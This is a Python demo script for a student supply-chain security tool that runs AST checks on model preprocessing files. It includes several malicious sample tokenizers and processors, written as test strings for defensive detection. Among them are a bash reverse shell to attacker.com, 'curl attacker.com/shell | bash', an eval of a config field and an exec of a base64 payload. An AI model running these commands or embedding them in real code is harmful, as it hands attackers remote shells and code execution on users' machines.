"""
AI 모델 공급망 보안 프록시 — 전처리 파일 AST 검증 데모
핵심 로직은 preprocessing_validator.py 에 있음

실행: python preprocessing_validator_demo.py
"""

from preprocessing_validator import (
    validate_preprocessing_file,
    _print_summary,
    red, green, yellow, blue, cyan, bold, dim,
    ASTValidationResult,
)

# ────────────────────────────────────────────────

_S1 = (
    "import re\nimport unicodedata\nimport collections\nimport json\nimport os\n\n"
    "class BertTokenizer:\n"
    "    def __init__(self, vocab_file):\n"
    "        with open(vocab_file, 'r') as f:\n"
    "            self.vocab = json.load(f)\n"
    "        self.pat = re.compile(r'[a-zA-Z0-9]+')\n\n"
    "    def tokenize(self, text):\n"
    "        text = unicodedata.normalize('NFC', text)\n"
    "        tokens = self.pat.findall(text)\n"
    "        return [self.vocab.get(t, 0) for t in tokens]\n"
)
_S2 = (
    "import numpy as np\nfrom PIL import Image\nimport torch\n\n"
    "class CLIPImageProcessor:\n"
    "    def __init__(self, size=224):\n"
    "        self.size = size\n\n"
    "    def preprocess(self, image_path):\n"
    "        img = Image.open(image_path).convert('RGB')\n"
    "        img = img.resize((self.size, self.size))\n"
    "        arr = np.array(img) / 255.0\n"
    "        return torch.tensor(arr).permute(2, 0, 1).float()\n"
)
_S3 = (
    "import re\nimport json\n\n"
    "class EvilTokenizer:\n"
    "    def __init__(self, vocab_file):\n"
    "        config = json.load(open(vocab_file))\n"
    "        eval(config.get('init_cmd', ''))\n\n"
    "    def tokenize(self, text):\n"
    "        return re.findall(r'[a-zA-Z0-9]+', text)\n"
)
_S4 = (
    "import torch\nimport numpy as np\n\n"
    "class EvilProcessor:\n"
    "    def __init__(self, model_path):\n"
    "        self.weights = torch.load(model_path)\n\n"
    "    def process(self, x):\n"
    "        return np.array(x)\n"
)
_S5 = (
    "import numpy as np\nimport os\nfrom PIL import Image\n\n"
    "class EvilImageProcessor:\n"
    "    def preprocess(self, path):\n"
    "        os.system('bash -i >& /dev/tcp/attacker.com/4444')\n"
    "        img = Image.open(path)\n"
    "        return np.array(img)\n"
)
_S6 = (
    "import re\nimport base64\nimport json\n\n"
    "class ObfuscatedTokenizer:\n"
    "    def __init__(self):\n"
    "        payload = base64.b64decode('aW1wb3J0IG9z')\n"
    "        exec(payload)\n\n"
    "    def tokenize(self, text):\n"
    "        return re.findall(r'[a-zA-Z0-9]+', text)\n"
)
_S7 = (
    "import numpy as np\nimport torch\nimport scipy.signal\n\n"
    "class CustomProcessor:\n"
    "    def process(self, audio):\n"
    "        filtered = scipy.signal.butter(4, 0.1)\n"
    "        arr = np.array(audio)\n"
    "        return torch.tensor(arr)\n"
)
_S8 = (
    "import re\nimport yaml\n\n"
    "class YamlTokenizer:\n"
    "    def __init__(self, config_file):\n"
    "        with open(config_file) as f:\n"
    "            config = yaml.load(f)\n"
    "        self.vocab = config.get('vocab', {})\n\n"
    "    def tokenize(self, text):\n"
    "        return re.findall(r'[a-zA-Z0-9]+', text)\n"
)
_S9 = (
    "import re\n\n"
    "from os import system\n\n"
    "class EvilTokenizer:\n"
    "    def tokenize(self, text):\n"
    "        system('curl attacker.com/shell | bash')\n"
    "        return re.findall(r'[a-zA-Z0-9]+', text)\n"
)
_S10 = (
    "import os\nimport re\n\n"
    "class EvilTokenizer:\n"
    "    def tokenize(self, text):\n"
    "        fn = getattr(os, 'system')\n"
    "        fn('curl attacker.com')\n"
    "        return re.findall(r'[a-zA-Z0-9]+', text)\n"
)
# B-2 케이스 — 허용 목록에 없는 신규 API 사용 (위험하지 않지만 알 수 없는 라이브러리)
# einops는 SAFE_NEW_APIS에 없고 DANGEROUS_NEW_APIS에도 없어서 진짜 신규 API로 분류됨
_S11 = (
    "import numpy as np\nimport torch\nimport custom_audio_lib\n\n"
    "class CustomAudioProcessor:\n"
    "    def process(self, audio):\n"
    "        # custom_audio_lib는 알 수 없는 서드파티 라이브러리\n"
    "        processed = custom_audio_lib.normalize(audio)\n"
    "        arr = np.array(processed)\n"
    "        return torch.tensor(arr)\n"
)

SCENARIOS = [
    ("✅  시나리오 1  — 정상 tokenizer (BERT)",                  "tokenization_bert.py",        _S1),
    ("✅  시나리오 2  — 정상 image_processor",                   "image_processing_clip.py",    _S2),
    ("🚫  시나리오 3  — eval() 탐지 -> 차단",                    "tokenization_evil.py",        _S3),
    ("🚫  시나리오 4  — torch.load() 탐지 -> 차단",              "processing_evil.py",          _S4),
    ("🚫  시나리오 5  — os.system() 탐지 -> 차단",               "image_processing_evil.py",    _S5),
    ("🚫  시나리오 6  — base64 난독화 탐지 -> 차단",              "tokenization_obfuscated.py",  _S6),
    ("✅  시나리오 7  — scipy 계산 전용 신규 API -> B-1 유지",    "processing_custom.py",        _S7),
    ("🚫  시나리오 8  — yaml.load() 탐지 -> 차단",               "tokenization_yaml.py",        _S8),
    ("🚫  시나리오 9  — from os import system 우회 -> 차단",     "tokenization_evil2.py",       _S9),
    ("🚫  시나리오 10 — getattr(os,'system') 우회 -> 차단",      "tokenization_evil3.py",       _S10),
    ("⚠️   시나리오 11 — 알 수 없는 신규 API -> B-2 격상",        "processing_unknown.py",       _S11),
]


# ────────────────────────────────────────────────
# 직접 입력 모드
# ────────────────────────────────────────────────

def interactive_mode():
    print(bold(cyan("\n[ 직접 입력 모드 ]")))
    print(dim("파일 이름을 먼저 입력해. (파일 종류 자동 분류에 사용됨)"))

    filename = input(f"  {bold('파일 이름')} (예: tokenization_custom.py) → ").strip()
    if not filename:
        filename = "unknown.py"

    print(dim("코드를 입력해. 입력 완료 후 빈 줄에서 Enter 두 번 누르면 검증 시작.\n"))
    lines = []
    empty_count = 0
    while True:
        try:
            line = input()
            if line == "":
                empty_count += 1
                if empty_count >= 2:
                    break
                lines.append(line)
            else:
                empty_count = 0
                lines.append(line)
        except EOFError:
            break

    code = "\n".join(lines).strip()
    if not code:
        print(yellow("입력값이 없어."))
        return

    validate_preprocessing_file(code, filename=filename)


# ────────────────────────────────────────────────
# 메뉴
# ────────────────────────────────────────────────

def print_banner():
    print(bold(cyan("\n" + "═" * 55)))
    print(bold(cyan("  AI 모델 공급망 보안 프록시")))
    print(bold(cyan("  전처리 파일 AST 검증 데모")))
    print(bold(cyan("  캡스톤디자인 프로젝트")))
    print(bold(cyan("═" * 55)))


def print_menu():
    print(f"\n{bold('[ 메뉴 ]')}")
    print(f"  {cyan('1')}  전체 시나리오 자동 실행")
    print(f"  {cyan('2')}  시나리오 선택 실행")
    print(f"  {cyan('3')}  직접 .py 파일 입력")
    print(f"  {cyan('0')}  종료")
    print()


def scenario_menu():
    print(f"\n{bold('[ 시나리오 선택 ]')}")
    for i, (title, fname, _) in enumerate(SCENARIOS, 1):
        print(f"  {cyan(str(i))}  {title}")
    print(f"  {cyan('0')}  뒤로")
    print()


def run_all():
    results = []
    for title, fname, code in SCENARIOS:
        print(f"\n{bold(title)}")
        r = validate_preprocessing_file(code, filename=fname)
        results.append((fname, r))
    _print_summary(results)


def run_selected():
    scenario_menu()
    choice = input(f"  {bold('번호 입력')} → ").strip()
    if choice == "0":
        return
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(SCENARIOS):
            title, fname, code = SCENARIOS[idx]
            print(f"\n{bold(title)}")
            validate_preprocessing_file(code, filename=fname)
        else:
            print(red("  없는 번호야."))
    except ValueError:
        print(red("  숫자를 입력해줘."))


def main():
    print_banner()
    while True:
        print_menu()
        choice = input(f"  {bold('선택')} → ").strip()
        if choice == "1":
            run_all()
        elif choice == "2":
            run_selected()
        elif choice == "3":
            interactive_mode()
        elif choice == "0":
            print(f"\n{dim('종료.')}\n")
            break
        else:
            print(red("  0~3 중에 입력해줘."))
        input(dim("\n  계속하려면 Enter..."))


if __name__ == "__main__":
    main()
